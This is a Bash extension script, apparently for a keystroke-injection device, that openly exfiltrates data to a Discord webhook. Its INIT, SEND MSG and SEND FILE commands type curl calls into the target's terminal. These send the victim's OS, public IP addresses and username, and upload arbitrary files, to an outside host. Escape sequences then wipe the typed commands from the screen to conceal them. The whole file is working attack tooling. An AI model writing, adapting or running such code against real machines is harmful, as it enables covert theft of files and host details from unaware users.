#!/bin/bash
#
# Title:         Discord Extension
# Description:   Interact with discord webhook to exfiltrate text or files
# Author:        quentin_lamamy <contact@quentin-lamamy.fr>
# Version:       1.0
# Category:      Extension
# 
# To use this extension, you need to create a webhook on discord and get the webhook id and token
# During your setup steps, you need to set the DISCORD_WEBHOOK_ID and DISCORD_WEBHOOK_TOKEN variables
# DISCORD_WEBHOOK_ID="<DISCORD_WEBHOOK_ID>""
# DISCORD_WEBHOOK_TOKEN="<DISCORD_WEBHOOK_TOKEN>"

function DISCORD() {

    case $1 in

        # @desc  Initialize the exfiltration session by posting an embed message on discord with host information
        # @usage DISCORD INIT
        # @info  This command need a $BB_HOST_* variables (Set by default if you use my OSX extension)
        "INIT")

            curl_location="https://discord.com/api/webhooks/$DISCORD_WEBHOOK_ID/$DISCORD_WEBHOOK_TOKEN"
            curl_header="Content-Type: application/json"

            Q STRING "printf '\e7'"
            Q ENTER
            Q STRING "curl --location '$curl_location'"
            Q STRING " --header '$curl_header'"
            Q STRING " --data '{\"embeds\": [{\"author\": {\"name\": \"New exfiltration session\",\"icon_url\": \"https://cdn-icons-png.flaticon.com/512/2/2235.png\"},\"color\": \"15258703\",\"fields\": [{\"name\":\"OS\",\"value\":\""
            Q STRING "'\${BB_HOST_OS}'"
            Q STRING "\",\"inline\":true},{\"name\":\"Public ip\",\"value\":\""
            Q STRING "'\${BB_HOST_IP_V4}'"
            Q STRING "\",\"inline\":true},{\"name\":\"Public ip\",\"value\":\""
            Q STRING "'\${BB_HOST_IP_V6}'"
            Q STRING "\",\"inline\":true},{\"name\":\"User\",\"value\":\""
            Q STRING "'\${BB_HOST_USER}'"
            Q STRING "\",\"inline\":true}]"
            Q STRING "}]}'"
            Q ENTER
            Q STRING "printf '\e8\e[1A\e[0J'"
            Q ENTER

        ;;
    
        "SEND")

            case $2 in

                # @desc  Send a message to discord via webhook
                # @usage DISCORD SEND MSG $yourMessage
                "MSG")

                    if [[ "$3" == *"$"* ]]; then
                        message="'$3'"
                    else
                        message=$3
                    fi
                    
                    Q STRING "printf '\e7'"
                    Q ENTER
                    Q STRING "curl --location 'https://discord.com/api/webhooks/$DISCORD_WEBHOOK_ID/$DISCORD_WEBHOOK_TOKEN' --header 'Content-Type: application/json' --data '{\"content\": \"$message\"}' && printf '\e[3A\e[K\e[0J'"
                    Q ENTER
                    Q STRING "printf '\e8\e[1A\e[0J'"
                    Q ENTER
                ;;

                # @desc  Send a file to discord via webhook
                # @usage DISCORD SEND FILE $yourFilePath
                "FILE")
                    Q STRING "printf '\e7'"
                    Q ENTER                
                    Q STRING "curl --location 'https://discord.com/api/webhooks/$DISCORD_WEBHOOK_ID/$DISCORD_WEBHOOK_TOKEN' --form '=@\"$3\"' && printf '\e[3A\e[K\e[0J'"
                    Q ENTER
                    Q STRING "printf '\e8\e[1A\e[0J'"
                    Q ENTER                    
                ;;

            esac
            
        ;;

    esac
}

export -f DISCORD